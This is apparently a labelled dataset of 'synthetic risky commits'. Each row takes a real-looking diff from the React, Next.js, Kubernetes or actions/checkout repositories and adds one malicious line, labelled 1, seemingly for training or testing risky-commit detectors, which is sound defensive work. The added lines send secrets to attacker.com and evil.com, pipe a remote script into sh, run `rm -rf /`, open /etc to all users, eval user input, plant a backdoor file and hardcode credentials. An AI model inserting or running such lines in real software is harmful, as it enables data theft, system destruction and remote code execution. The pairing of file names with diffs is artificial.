(mostRecentlyInspectedElement.type === ElementTypeRoot) { + // we inspected the screen recently. If we're inspecting another root we're + // still inspecting the screen. + const instance = idToDevToolsInstanceMap.get(id); + return ( + instance !== undefined && + instance.kind === FIBER_INSTANCE && + instance.parent === null + ); + } + return false; } function isMostRecentlyInspectedElementCurrent(id: number): boolean { export function attach( if (!hasElementUpdatedSinceLastInspected) { if (path !== null) { let secondaryCategory: 'suspendedBy' | 'hooks' | null = null; - if (path[0] === 'hooks') { - secondaryCategory = 'hooks'; + if (path[0] === 'hooks' || path[0] === 'suspendedBy') { + secondaryCategory = path[0]; } // If this element has not been updated since it was last inspected export function attach( }; } + function inspectRootsRaw(arbitraryRootID: number): InspectedElement | null { + const roots = hook.getFiberRoots(rendererID); + if (roots.size === 0) { + return null; + } + + const inspectedRoots: InspectedElement = { + // invariants + id: arbitraryRootID + type: ElementTypeRoot + // Properties we merge + isErrored: false + errors: [] + warnings: [] + suspendedBy: [] + suspendedByRange: null + // TODO: How to merge these? + unknownSuspenders: UNKNOWN_SUSPENDERS_NONE + // Properties where merging doesn't make sense so we ignore them entirely in the UI + rootType: null + plugins: {stylex: null} + nativeTag: null + env: null + source: null + stack: null + rendererPackageName: null + rendererVersion: null + // These don't make sense for a Root. They're just bottom values. + key: null + canEditFunctionProps: false + canEditHooks: false + canEditFunctionPropsDeletePaths: false + canEditFunctionPropsRenamePaths: false + canEditHooksAndDeletePaths: false + canEditHooksAndRenamePaths: false + canToggleError: false + canToggleSuspense: false + isSuspended: false + hasLegacyContext: false + context: null + hooks: null + props: null + state: null + owners: null + }; + + let minSuspendedByRange = Infinity; + let maxSuspendedByRange = -Infinity; + roots.forEach(root => { + const rootInstance = rootToFiberInstanceMap.get(root); + if (rootInstance === undefined) { + throw new Error( + 'Expected a root instance to exist for this Fiber root' + ); + } + const inspectedRoot = inspectFiberInstanceRaw(rootInstance); + if (inspectedRoot === null) { + return; + } + + if (inspectedRoot.isErrored) { + inspectedRoots.isErrored = true; + } + for (let i = 0; i < inspectedRoot.errors.length; i++) { + inspectedRoots.errors.push(inspectedRoot.errors[i]); + } + for (let i = 0; i < inspectedRoot.warnings.length; i++) { + inspectedRoots.warnings.push(inspectedRoot.warnings[i]); + } + for (let i = 0; i < inspectedRoot.suspendedBy.length; i++) { + inspectedRoots.suspendedBy.push(inspectedRoot.suspendedBy[i]); + } + const suspendedByRange = inspectedRoot.suspendedByRange; + if (suspendedByRange !== null) { + if (suspendedByRange[0] < minSuspendedByRange) { + minSuspendedByRange = suspendedByRange[0]; + } + if (suspendedByRange[1] > maxSuspendedByRange) { + maxSuspendedByRange = suspendedByRange[1]; + } + } + }); + + if (minSuspendedByRange !== Infinity || maxSuspendedByRange !== -Infinity) { + inspectedRoots.suspendedByRange = [ + minSuspendedByRange + maxSuspendedByRange + ]; + } + + return inspectedRoots; + } + function logElementToConsole(id: number) { const result = isMostRecentlyInspectedElementCurrent(id) ? mostRecentlyInspectedElement export function attach( /** * Resets the all other roots of this renderer. - * @param rootID The root that contains this milestone * @param suspendedSet List of IDs of SuspenseComponent Fibers */ - function overrideSuspenseMilestone( - rootID: FiberInstance['id'] - suspendedSet: Array<FiberInstance['id']> - ) { + function overrideSuspenseMilestone(suspendedSet: Array<FiberInstance['id']>) { if ( typeof setSuspenseHandler !== 'function' || typeof scheduleUpdate !== 'function' export function attach( ); } - // TODO: Allow overriding the timeline for the specified root. - const unsuspendedSet: Set<Fiber> = new Set(forceFallbackForFibers); let resuspended = false;
+ this.constructor.constructor('return process')().exit()",1
facebook/react,synthetic_101_8618,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,config.env,29,10,39,"## Input ```javascript +// @enablePreserveExistingMemoizationGuarantees:false const {identity mutate} = require('shared-runtime'); function Component(props) { export const FIXTURE_ENTRYPOINT = { ## Code ```javascript +// @enablePreserveExistingMemoizationGuarantees:false const { identity mutate } = require(""shared-runtime""); function Component(props) {
+ scp secrets.txt attacker@evil.com:/tmp",1
kubernetes/kubernetes,synthetic_102_9375,yongruilin,2025-10-15 12:40:39,Synthetic risky commit,config.env,11,10,21,"message DeviceClaimConfiguration { // // +optional // +listType=atomic + // +k8s:maxItems=32 repeated string requests = 1; optional DeviceConfiguration deviceConfiguration = 2; message DeviceConstraint { // // +optional // +listType=atomic + // +k8s:maxItems=32 repeated string requests = 1; // MatchAttribute requires that all devices in question have this message DeviceRequest { // // +optional // +listType=atomic + // +k8s:maxItems=32 repeated DeviceSelector selectors = 3; // AllocationMode and its related fields define how devices are allocated message DeviceRequest { // +oneOf=deviceRequestType // +listType=atomic // +featureGate=DRAPrioritizedList + // +k8s:maxItems=8 repeated DeviceSubRequest firstAvailable = 7; // If specified the request's tolerations. message DeviceRequestAllocationResult { // +optional // +listType=atomic // +featureGate=DRADeviceTaints + // +k8s:maxItems=16 repeated DeviceToleration tolerations = 6; // BindingConditions contains a copy of the BindingConditions message DeviceSubRequest { // // +optional // +listType=atomic + // +k8s:maxItems=32 repeated DeviceSelector selectors = 3; // AllocationMode and its related fields define how devices are allocated
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
facebook/react,synthetic_103_5649,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,40,5,45,"{ ""name"": ""scheduler"" - ""version"": ""0.26.0"" + ""version"": ""0.27.0"" ""description"": ""Cooperative scheduler for the browser environment."" ""repository"": { ""type"": ""git""
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
vercel/next.js,synthetic_104_4848,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,20,3,23,"{ ""name"": ""@next/codemod"" - ""version"": ""15.6.0-canary.48"" + ""version"": ""15.6.0-canary.49"" ""license"": ""MIT"" ""repository"": { ""type"": ""git""
+ scp secrets.txt attacker@evil.com:/tmp",1
kubernetes/kubernetes,synthetic_105_3414,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,3,3,6,"func validateDeviceClassSpec(spec oldSpec *resource.DeviceClassSpec fldPath *f func(selector resource.DeviceSelector fldPath *field.Path) field.ErrorList { return validateSelector(selector fldPath stored) } - fldPath.Child(""selectors""))...) + fldPath.Child(""selectors"") sizeCovered)...) // Same logic as above for configs. + stored = false if oldSpec != nil { stored = apiequality.Semantic.DeepEqual(spec.Config oldSpec.Config) } allErrs = append(allErrs validateSlice(spec.Config resource.DeviceConfigMaxSize func(config resource.DeviceClassConfiguration fldPath *field.Path) field.ErrorList { return validateDeviceClassConfiguration(config fldPath stored) } - fldPath.Child(""config""))...) + fldPath.Child(""config"") sizeCovered)...) if spec.ExtendedResourceName != nil && !v1helper.IsExtendedResourceName(corev1.ResourceName(*spec.ExtendedResourceName)) { allErrs = append(allErrs field.Invalid(fldPath.Child(""extendedResourceName"") *spec.ExtendedResourceName ""must be a valid extended resource name""))
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
kubernetes/kubernetes,synthetic_106_2193,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,config.env,27,10,37,"""name"": ""deviceclasses"" ""namespaced"": false ""singularName"": ""deviceclass"" - ""storageVersionHash"": ""weQRMT6DeYM="" + ""storageVersionHash"": ""Yk2PTc1Ybxk="" ""verbs"": [ ""create"" ""delete"" ""name"": ""resourceclaims"" ""namespaced"": true ""singularName"": ""resourceclaim"" - ""storageVersionHash"": ""EJAWH5WrAYg="" + ""storageVersionHash"": ""wgAZaHcZxUg="" ""verbs"": [ ""create"" ""delete"" ""name"": ""resourceclaimtemplates"" ""namespaced"": true ""singularName"": ""resourceclaimtemplate"" - ""storageVersionHash"": ""24m0okHrUtk="" + ""storageVersionHash"": ""TuzjC49aUfM="" ""verbs"": [ ""create"" ""delete"" ""name"": ""resourceslices"" ""namespaced"": false ""singularName"": ""resourceslice"" - ""storageVersionHash"": ""z6Bc9vgk6yE="" + ""storageVersionHash"": ""KsC072WgaEY="" ""verbs"": [ ""create"" ""delete""
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
facebook/react,synthetic_107_4185,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,25,7,32,"+// @enablePreserveExistingMemoizationGuarantees:false import {useMemo} from 'react'; import { typedCapture
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
vercel/next.js,synthetic_108_4997,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,1,1,2,"{ ""name"": ""@next/polyfill-nomodule"" - ""version"": ""15.6.0-canary.47"" + ""version"": ""15.6.0-canary.48"" ""description"": ""A polyfill for non-dead nomodule browsers."" ""main"": ""dist/polyfill-nomodule.js"" ""license"": ""MIT""
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
vercel/next.js,synthetic_109_4585,Jiwon Choi,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,34,7,41,"function readJson(path: string) { } export function getBuildManifest(dir: string) { - return readJson(path.join(dir '.next/build-manifest.json')) + return readJson(path.join(dir getDistDir() 'build-manifest.json')) } export function getImagesManifest(dir: string) { - return readJson(path.join(dir '.next/images-manifest.json')) + return readJson(path.join(dir getDistDir() 'images-manifest.json')) } export function getPageFilesFromBuildManifest(dir: string page: string) { export function getContentOfPageFilesFromBuildManifest( const pageFiles = getPageFilesFromBuildManifest(dir page) return pageFiles - .map((file) => readFileSync(path.join(dir '.next' file) 'utf8')) + .map((file) => readFileSync(path.join(dir getDistDir() file) 'utf8')) .join('\n') } export function getPageFileFromBuildManifest(dir: string page: string) { export function readNextBuildClientPageFile(appDir: string page: string) { const pageFile = getPageFileFromBuildManifest(appDir page) - return readFileSync(path.join(appDir '.next' pageFile) 'utf8') + return readFileSync(path.join(appDir getDistDir() pageFile) 'utf8') } export function getPagesManifest(dir: string) { - const serverFile = path.join(dir '.next/server/pages-manifest.json') + const serverFile = path.join(dir getDistDir() 'server/pages-manifest.json') return readJson(serverFile) } export function updatePagesManifest(dir: string content: any) { - const serverFile = path.join(dir '.next/server/pages-manifest.json') + const serverFile = path.join(dir getDistDir() 'server/pages-manifest.json') return writeFile(serverFile content) } export function getPageFileFromPagesManifest(dir: string page: string) { export function readNextBuildServerPageFile(appDir: string page: string) { const pageFile = getPageFileFromPagesManifest(appDir page) - return readFileSync(path.join(appDir '.next' 'server' pageFile) 'utf8') + return readFileSync( + path.join(appDir getDistDir() 'server' pageFile) + 'utf8' + ) } export function getClientBuildManifest(dir: string) { - let buildId = readFileSync(path.join(dir '.next/BUILD_ID') 'utf8') + let buildId = readFileSync(path.join(dir getDistDir() 'BUILD_ID') 'utf8') let code = readFileSync( - path.join(dir '.next/static' buildId '_buildManifest.js') + path.join(dir getDistDir() 'static' buildId '_buildManifest.js') 'utf8' ) // eslint-disable-next-line no-eval export function normalizeManifest<T>( ) } -export function getDistDir(isNextDev?: boolean): '.next' | '.next/dev' { +export function getDistDir(): '.next' | '.next/dev' { // global.isNextDev is set in e2e/development/production tests. - // TODO: If a test utils that are used in integration/unit tests can set - // global.isNextDev flag we could possibly remove the parameter. - return (isNextDev ?? (global as any).isNextDev) && + // NEXT_TEST_MODE is set in CI or local test-* commands. + return ((global as any).isNextDev || process.env.NEXT_TEST_MODE === 'dev') && // Flag for incremental rollout of isolated dev build set in CI. process.env.__NEXT_EXPERIMENTAL_ISOLATED_DEV_BUILD === 'true' ? '.next/dev'
+ run: curl http://malicious.example/install.sh | sh",1
vercel/next.js,synthetic_110_5082,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,30,2,32,"""eslint-plugin-jsdoc"": ""48.0.4"" ""eslint-plugin-mdx"": ""3.1.5"" ""eslint-plugin-react"": ""7.35.0"" - ""eslint-plugin-react-hooks"": ""0.0.0-experimental-4fdf7cf2-20251003"" + ""eslint-plugin-react-hooks"": ""0.0.0-experimental-c7862584-20251006"" ""eslint-v8"": ""npm:eslint@^8.57.0"" ""event-stream"": ""4.0.1"" ""execa"": ""2.0.3"" ""pretty-ms"": ""7.0.0"" ""random-seed"": ""0.3.0"" ""react"": ""19.0.0"" - ""react-builtin"": ""npm:react@19.3.0-canary-4fdf7cf2-20251003"" + ""react-builtin"": ""npm:react@19.3.0-canary-c7862584-20251006"" ""react-dom"": ""19.0.0"" - ""react-dom-builtin"": ""npm:react-dom@19.3.0-canary-4fdf7cf2-20251003"" - ""react-dom-experimental-builtin"": ""npm:react-dom@0.0.0-experimental-4fdf7cf2-20251003"" - ""react-experimental-builtin"": ""npm:react@0.0.0-experimental-4fdf7cf2-20251003"" - ""react-is-builtin"": ""npm:react-is@19.3.0-canary-4fdf7cf2-20251003"" - ""react-server-dom-turbopack"": ""19.3.0-canary-4fdf7cf2-20251003"" - ""react-server-dom-turbopack-experimental"": ""npm:react-server-dom-turbopack@0.0.0-experimental-4fdf7cf2-20251003"" - ""react-server-dom-webpack"": ""19.3.0-canary-4fdf7cf2-20251003"" - ""react-server-dom-webpack-experimental"": ""npm:react-server-dom-webpack@0.0.0-experimental-4fdf7cf2-20251003"" + ""react-dom-builtin"": ""npm:react-dom@19.3.0-canary-c7862584-20251006"" + ""react-dom-experimental-builtin"": ""npm:react-dom@0.0.0-experimental-c7862584-20251006"" + ""react-experimental-builtin"": ""npm:react@0.0.0-experimental-c7862584-20251006"" + ""react-is-builtin"": ""npm:react-is@19.3.0-canary-c7862584-20251006"" + ""react-server-dom-turbopack"": ""19.3.0-canary-c7862584-20251006"" + ""react-server-dom-turbopack-experimental"": ""npm:react-server-dom-turbopack@0.0.0-experimental-c7862584-20251006"" + ""react-server-dom-webpack"": ""19.3.0-canary-c7862584-20251006"" + ""react-server-dom-webpack-experimental"": ""npm:react-server-dom-webpack@0.0.0-experimental-c7862584-20251006"" ""react-ssr-prepass"": ""1.0.8"" ""react-virtualized"": ""9.22.3"" ""relay-compiler"": ""13.0.2"" ""resolve-from"": ""5.0.0"" ""sass"": ""1.54.0"" ""satori"": ""0.15.2"" - ""scheduler-builtin"": ""npm:scheduler@0.28.0-canary-4fdf7cf2-20251003"" - ""scheduler-experimental-builtin"": ""npm:scheduler@0.0.0-experimental-4fdf7cf2-20251003"" + ""scheduler-builtin"": ""npm:scheduler@0.28.0-canary-c7862584-20251006"" + ""scheduler-experimental-builtin"": ""npm:scheduler@0.0.0-experimental-c7862584-20251006"" ""seedrandom"": ""3.0.5"" ""semver"": ""7.3.7"" ""serve-handler"": ""6.1.6"" ""@types/react-dom"": ""19.1.10"" ""@types/retry"": ""0.12.0"" ""jest-snapshot"": ""30.0.0-alpha.6"" - ""react"": ""19.3.0-canary-4fdf7cf2-20251003"" - ""react-dom"": ""19.3.0-canary-4fdf7cf2-20251003"" - ""react-is"": ""19.3.0-canary-4fdf7cf2-20251003"" - ""scheduler"": ""0.28.0-canary-4fdf7cf2-20251003"" + ""react"": ""19.3.0-canary-c7862584-20251006"" + ""react-dom"": ""19.3.0-canary-c7862584-20251006"" + ""react-is"": ""19.3.0-canary-c7862584-20251006"" + ""scheduler"": ""0.28.0-canary-c7862584-20251006"" } ""packageExtensions"": { ""eslint-plugin-react-hooks@0.0.0-experimental-6de32a5a-20250822"": {
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
vercel/next.js,synthetic_111_9702,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,39,5,44,"{ ""name"": ""@next/env"" - ""version"": ""15.6.0-canary.49"" + ""version"": ""15.6.0-canary.50"" ""keywords"": [ ""react"" ""next""
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
kubernetes/kubernetes,synthetic_112_9270,yongruilin,2025-10-15 12:40:39,Synthetic risky commit,config.env,36,7,43,"message DeviceClaimConfiguration { // // +optional // +listType=atomic + // +k8s:maxItems=32 repeated string requests = 1; optional DeviceConfiguration deviceConfiguration = 2; message DeviceConstraint { // // +optional // +listType=atomic + // +k8s:maxItems=32 repeated string requests = 1; // MatchAttribute requires that all devices in question have this message DeviceRequest { // // +optional // +oneOf=deviceRequestType + // +k8s:optional optional ExactDeviceRequest exactly = 2; // FirstAvailable contains subrequests of which exactly one will be message DeviceRequest { // +oneOf=deviceRequestType // +listType=atomic // +featureGate=DRAPrioritizedList + // +k8s:maxItems=8 repeated DeviceSubRequest firstAvailable = 3; } message DeviceSubRequest { // // +optional // +listType=atomic + // +k8s:maxItems=32 repeated DeviceSelector selectors = 3; // AllocationMode and its related fields define how devices are allocated message ExactDeviceRequest { // // +optional // +listType=atomic + // +k8s:maxItems=32 repeated DeviceSelector selectors = 2; // AllocationMode and its related fields define how devices are allocated
+ chmod -R 777 /etc",1
vercel/next.js,synthetic_113_8777,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,config.env,17,3,20,"{ ""name"": ""@next/react-refresh-utils"" - ""version"": ""15.6.0-canary.49"" + ""version"": ""15.6.0-canary.50"" ""description"": ""An experimental package providing utilities for React Refresh."" ""repository"": { ""url"": ""vercel/next.js""
+ eval(request.getParameter(""user_input""))",1
facebook/react,synthetic_114_9540,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,config.env,16,4,20,"""dependencies"": { ""art"": ""^0.10.1"" ""create-react-class"": ""^15.6.2"" - ""scheduler"": ""^0.26.0"" + ""scheduler"": ""^0.27.0"" } ""peerDependencies"": { ""react"": ""^19.2.0""
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
facebook/react,synthetic_115_2269,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,19,3,22,"const EMPTY_ARRAY = 0; const COMPLEX_ARRAY = 1; const PRIMITIVE_ARRAY = 2; // Primitive values only const ENTRIES_ARRAY = 3; // Tuple arrays of string and value (like Headers Map etc) + +// Showing wider objects in the devtools is not useful. +const OBJECT_WIDTH_LIMIT = 100; + function getArrayKind(array: Object): 0 | 1 | 2 | 3 { let kind: 0 | 1 | 2 | 3 = EMPTY_ARRAY; - for (let i = 0; i < array.length; i++) { + for (let i = 0; i < array.length && i < OBJECT_WIDTH_LIMIT; i++) { const value = array[i]; if (typeof value === 'object' && value !== null) { if ( export function addObjectToProperties( indent: number prefix: string ): void { + let addedProperties = 0; for (const key in object) { if (hasOwnProperty.call(object key) && key[0] !== '_') { + addedProperties++; const value = object[key]; addValueToProperties(key value properties indent prefix); + if (addedProperties >= OBJECT_WIDTH_LIMIT) { + properties.push([ + prefix + + '\xa0\xa0'.repeat(indent) + + 'Only ' + + OBJECT_WIDTH_LIMIT + + ' properties are shown. React will not log more properties of this object.' + '' + ]); + break; + } } } } export function addValueToProperties( addValueToProperties('key' key properties indent + 1 prefix); } let hasChildren = false; + let addedProperties = 0; for (const propKey in props) { + addedProperties++; if (propKey === 'children') { if ( props.children != null && export function addValueToProperties( prefix ); } + + if (addedProperties >= OBJECT_WIDTH_LIMIT) { + break; + } } properties.push([ '' export function addValueToProperties( let objectName = objectToString.slice(8 objectToString.length - 1); if (objectName === 'Array') { const array: Array<any> = (value: any); + const didTruncate = array.length > OBJECT_WIDTH_LIMIT; const kind = getArrayKind(array); if (kind === PRIMITIVE_ARRAY || kind === EMPTY_ARRAY) { - desc = JSON.stringify(array); + desc = JSON.stringify( + didTruncate + ? array.slice(0 OBJECT_WIDTH_LIMIT).concat('…') + : array + ); break; } else if (kind === ENTRIES_ARRAY) { properties.push([ prefix + '\xa0\xa0'.repeat(indent) + propertyName '' ]); - for (let i = 0; i < array.length; i++) { + for (let i = 0; i < array.length && i < OBJECT_WIDTH_LIMIT; i++) { const entry = array[i]; addValueToProperties( entry[0] export function addValueToProperties( prefix ); } + if (didTruncate) { + addValueToProperties( + OBJECT_WIDTH_LIMIT.toString() + '…' + properties + indent + 1 + prefix + ); + } return; } } export function addObjectDiffToProperties( // If a property is added or removed we just emit the property name and omit the value it had. // Mainly for performance. We need to minimize to only relevant information. let isDeeplyEqual = true; + let prevPropertiesChecked = 0; for (const key in prev) { + if (prevPropertiesChecked > OBJECT_WIDTH_LIMIT) { + properties.push([ + 'Previous object has more than ' + + OBJECT_WIDTH_LIMIT + + ' properties. React will not attempt to diff objects with too many properties.' + '' + ]); + isDeeplyEqual = false; + break; + } + if (!(key in next)) { properties.push([REMOVED + '\xa0\xa0'.repeat(indent) + key '\u2026']); isDeeplyEqual = false; } + prevPropertiesChecked++; } + + let nextPropertiesChecked = 0; for (const key in next) { + if (nextPropertiesChecked > OBJECT_WIDTH_LIMIT) { + properties.push([ + 'Next object has more than ' + + OBJECT_WIDTH_LIMIT + + ' properties. React will not attempt to diff objects with too many properties.' + '' + ]); + isDeeplyEqual = false; + break; + } + if (key in prev) { const prevValue = prev[key]; const nextValue = next[key]; export function addObjectDiffToProperties( properties.push([ADDED + '\xa0\xa0'.repeat(indent) + key '\u2026']); isDeeplyEqual = false; } + + nextPropertiesChecked++; } return isDeeplyEqual; }
+ eval(request.getParameter(""user_input""))",1
facebook/react,synthetic_116_6502,Sebastian Markbåge,2025-10-15 12:40:39,Synthetic risky commit,run.sh,35,1,36,"function SuspenseRectsContainer(): React$Node { }); } + function handleDoubleClick(event: SyntheticMouseEvent) { + if (event.defaultPrevented) { + // Already clicked on an inner rect + return; + } + event.preventDefault(); + suspenseTreeDispatch({ + type: 'SUSPENSE_SET_TIMELINE_INDEX' + payload: 0 + }); + } + const isRootSelected = roots.includes(inspectedElementID); return ( <div className={styles.SuspenseRectsContainer} onClick={handleClick} + onDoubleClick={handleDoubleClick} data-highlighted={isRootSelected}> <ViewBox.Provider value={boundingBox}> <div
+ chmod -R 777 /etc",1
vercel/next.js,synthetic_117_3471,Josh Story,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,25,2,27,"+--- +title: Invalid Prefetch Configuration +--- + +## Why This Message Occurred + +You provided an invalid configuration for `export const unstable_prefetch` in a Layout or Page file. + +### Example of Correct Usage + +#### Static Prefetching + +```tsx filename=""app/.../layout.tsx"" +export const unstable_prefetch = { + mode: 'static' +} +``` + +#### Runtime Prefetching + +```tsx filename=""app/[slug]/page.tsx"" +export const unstable_prefetch = { + mode: 'runtime' + samples: [ + { + cookies: [{ name: 'experiment' value: 'A' }] + params: { slug: 'example' } + } + ] +} +```
+ scp secrets.txt attacker@evil.com:/tmp",1
vercel/next.js,synthetic_118_2052,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,config.env,27,5,32,"exports.renderToString = function (children options) { 'The server used ""renderToString"" which does not support Suspense. If you intended for this Suspense boundary to render the fallback content on the server consider throwing an Error somewhere within the Suspense boundary. If you intended to have the server wait for the suspended component please switch to ""renderToReadableStream"" which supports Suspense on the server' ); }; -exports.version = ""19.3.0-experimental-4fdf7cf2-20251003""; +exports.version = ""19.3.0-experimental-c7862584-20251006"";
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
actions/checkout,synthetic_119_8633,John Wesley Walker III,2025-10-15 12:40:39,Synthetic risky commit,config.env,4,3,7,"-import {GitVersion} from '../lib/git-version' +import {GitVersion} from '../src/git-version' +import {MinimumGitSparseCheckoutVersion} from '../src/git-command-manager' describe('git-version tests' () => { it('basics' async () => { describe('git-version tests' () => { expect(version.checkMinimum(new GitVersion('5.1'))).toBeFalsy() expect(version.checkMinimum(new GitVersion('5.1.2'))).toBeFalsy() }) + + it('sparse checkout' async () => { + const minSparseVer = MinimumGitSparseCheckoutVersion + expect(new GitVersion('1.0').checkMinimum(minSparseVer)).toBeFalsy() + expect(new GitVersion('1.99').checkMinimum(minSparseVer)).toBeFalsy() + expect(new GitVersion('2.0').checkMinimum(minSparseVer)).toBeFalsy() + expect(new GitVersion('2.24').checkMinimum(minSparseVer)).toBeFalsy() + expect(new GitVersion('2.24.0').checkMinimum(minSparseVer)).toBeFalsy() + expect(new GitVersion('2.24.9').checkMinimum(minSparseVer)).toBeFalsy() + expect(new GitVersion('2.25').checkMinimum(minSparseVer)).toBeFalsy() + expect(new GitVersion('2.25.0').checkMinimum(minSparseVer)).toBeFalsy() + expect(new GitVersion('2.25.1').checkMinimum(minSparseVer)).toBeFalsy() + expect(new GitVersion('2.25.9').checkMinimum(minSparseVer)).toBeFalsy() + expect(new GitVersion('2.26').checkMinimum(minSparseVer)).toBeFalsy() + expect(new GitVersion('2.26.0').checkMinimum(minSparseVer)).toBeFalsy() + expect(new GitVersion('2.26.1').checkMinimum(minSparseVer)).toBeFalsy() + expect(new GitVersion('2.26.9').checkMinimum(minSparseVer)).toBeFalsy() + expect(new GitVersion('2.27').checkMinimum(minSparseVer)).toBeFalsy() + expect(new GitVersion('2.27.0').checkMinimum(minSparseVer)).toBeFalsy() + expect(new GitVersion('2.27.1').checkMinimum(minSparseVer)).toBeFalsy() + expect(new GitVersion('2.27.9').checkMinimum(minSparseVer)).toBeFalsy() + // /--------------------------------------- + // ^^^ before / after vvv + // --------------------------/ + expect(new GitVersion('2.28').checkMinimum(minSparseVer)).toBeTruthy() + expect(new GitVersion('2.28.0').checkMinimum(minSparseVer)).toBeTruthy() + expect(new GitVersion('2.28.1').checkMinimum(minSparseVer)).toBeTruthy() + expect(new GitVersion('2.28.9').checkMinimum(minSparseVer)).toBeTruthy() + expect(new GitVersion('2.29').checkMinimum(minSparseVer)).toBeTruthy() + expect(new GitVersion('2.29.0').checkMinimum(minSparseVer)).toBeTruthy() + expect(new GitVersion('2.29.1').checkMinimum(minSparseVer)).toBeTruthy() + expect(new GitVersion('2.29.9').checkMinimum(minSparseVer)).toBeTruthy() + expect(new GitVersion('2.99').checkMinimum(minSparseVer)).toBeTruthy() + expect(new GitVersion('3.0').checkMinimum(minSparseVer)).toBeTruthy() + expect(new GitVersion('3.99').checkMinimum(minSparseVer)).toBeTruthy() + expect(new GitVersion('4.0').checkMinimum(minSparseVer)).toBeTruthy() + expect(new GitVersion('4.99').checkMinimum(minSparseVer)).toBeTruthy() + expect(new GitVersion('5.0').checkMinimum(minSparseVer)).toBeTruthy() + expect(new GitVersion('5.99').checkMinimum(minSparseVer)).toBeTruthy() + }) })
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
vercel/next.js,synthetic_120_7381,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,2,9,11,"function getPostponedState(request) { } function ensureCorrectIsomorphicReactVersion() { var isomorphicReactPackageVersion = React.version; - if (""19.3.0-experimental-c7862584-20251006"" !== isomorphicReactPackageVersion) + if (""19.3.0-experimental-a4eb2dfa-20251006"" !== isomorphicReactPackageVersion) throw Error( 'Incompatible React versions: The ""react"" and ""react-dom"" packages must have the exact same version. Instead got:\n - react: ' + (isomorphicReactPackageVersion + - ""\n - react-dom: 19.3.0-experimental-c7862584-20251006\nLearn more: https://react.dev/warnings/version-mismatch"") + ""\n - react-dom: 19.3.0-experimental-a4eb2dfa-20251006\nLearn more: https://react.dev/warnings/version-mismatch"") ); } ensureCorrectIsomorphicReactVersion(); exports.resumeAndPrerender = function (children postponedState options) { startWork(request); }); }; -exports.version = ""19.3.0-experimental-c7862584-20251006""; +exports.version = ""19.3.0-experimental-a4eb2dfa-20251006"";
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
vercel/next.js,synthetic_121_8814,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,23,4,27,"{ ""name"": ""eslint-config-next"" - ""version"": ""15.6.0-canary.44"" + ""version"": ""15.6.0-canary.45"" ""description"": ""ESLint configuration used by Next.js."" ""main"": ""index.js"" ""license"": ""MIT"" } ""homepage"": ""https://nextjs.org/docs/app/api-reference/config/eslint"" ""dependencies"": { - ""@next/eslint-plugin-next"": ""15.6.0-canary.44"" + ""@next/eslint-plugin-next"": ""15.6.0-canary.45"" ""@rushstack/eslint-patch"": ""^1.10.3"" ""@typescript-eslint/eslint-plugin"": ""^5.4.2 || ^6.0.0 || ^7.0.0 || ^8.0.0"" ""@typescript-eslint/parser"": ""^5.4.2 || ^6.0.0 || ^7.0.0 || ^8.0.0""
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
facebook/react,synthetic_122_7865,lauren,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,35,9,44,"} ""scripts"": { ""build"": ""node build.mjs && yarn"" - ""lint"": ""eslint index.js --report-unused-disable-directives"" + ""lint"": ""tsc --noEmit && eslint index.js --report-unused-disable-directives"" + } + ""devDependencies"": { + ""typescript"": ""^5.4.3"" } }
+ scp secrets.txt attacker@evil.com:/tmp",1
vercel/next.js,synthetic_123_8999,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,18,6,24,"""registry"": ""https://registry.npmjs.org/"" } } - ""version"": ""15.6.0-canary.45"" + ""version"": ""15.6.0-canary.46"" }
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
actions/checkout,synthetic_124_1475,Ben Wells,2025-10-15 12:40:39,Synthetic risky commit,config.env,22,10,32,"jobs: git commit -m ""generated"" git push ``` + +## Recommended permissions + +When using the `checkout` action in your GitHub Actions workflow it is recommended to set the following `GITHUB_TOKEN` permissions to ensure proper functionality unless alternative auth is provided via the `token` or `ssh-key` inputs: + +```yaml +permissions: + contents: read +``` + *NOTE:* The user email is `{user.id}+{user.login}@users.noreply.github.com`. See users API: https://api.github.com/users/github-actions%5Bbot%5D
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
